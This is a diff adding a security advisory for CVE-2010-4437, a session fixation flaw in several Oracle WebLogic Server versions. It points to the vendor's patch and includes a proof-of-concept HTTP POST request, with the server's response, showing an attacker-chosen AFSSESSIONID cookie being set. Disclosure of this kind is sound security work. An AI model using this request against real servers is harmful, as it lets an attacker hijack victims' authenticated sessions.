@@ -1,0 +1,32 @@
+Name	Oracle WebLogic – Session Fixation Via HTTP POST Request
+Vendor Website	http://www.oracle.com/
+Date Released	11 March 2011 – CVE-2010-4437
+Affected Software	Oracle WebLogic Server 9.0, 9.1, 9.2.4, 10.0.2, 10.3.2, 10.3.3
+Researcher	Roberto Suggi Liverani
+
+Description
+
+Oracle WebLogic servlet session cookie can be fixated via HTTP POST request. This type of session fixation attack has been confirmed with different session descriptor elements. In particular, the attack has also been confirmed with the session descriptor element <url-rewriting-enabled> set to "False". Such setting prevents session fixation attack via HTTP GET request but fails to mitigate session fixation attacks performed over HTTP POST.
+
+Exploitation
+
+A malicious user obtains a valid servlet session (e.g. AFSSESSIONID) and then forces a user to perform an HTTP POST request which sets the AFSSESSIONID cookie into the user's browser. The cookie AFSESSIONID is passed as a parameter within the body of the HTTP POST request to the Oracle WebLogic Server, as shown below:
+Session Fixation Via HTTP POST Request
+POST /test/test.jsp HTTP/1.1
+Host: 192.168.0.100:7001
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 76
+AFSSESSIONID=kWCsMjVKKvRh0ct14JJltYTrmXBWyBqh8brv6wfjrVrk4K2mB1yv!1587485378
+HTTP/1.1 200 OK
+Date: Thu, 12 Aug 2010 11:18:42 GMT
+Content-Length: 459
+Content-Type: text/html; charset=ISO-8859-1
+Set-Cookie: AFSSESSIONID=kWCsMjVKKvRh0ct14JJltYTrmXBWyBqh8brv6wfjrVrk4K2mB1yv!1587485378; path=/; HttpOnly
+
+X-Powered-By: Servlet/2.5 JSP/2.1
+Solution
+
+Oracle has created a fix for this vulnerability which has been included as part of Critical Patch Update Advisory -January 2011. Security-Assessment.com recommends applying the latest patch provided by the vendor. For more information, visit: 
+
+http://www.oracle.com/technetwork/topics/security/cpujan2011-194091.html
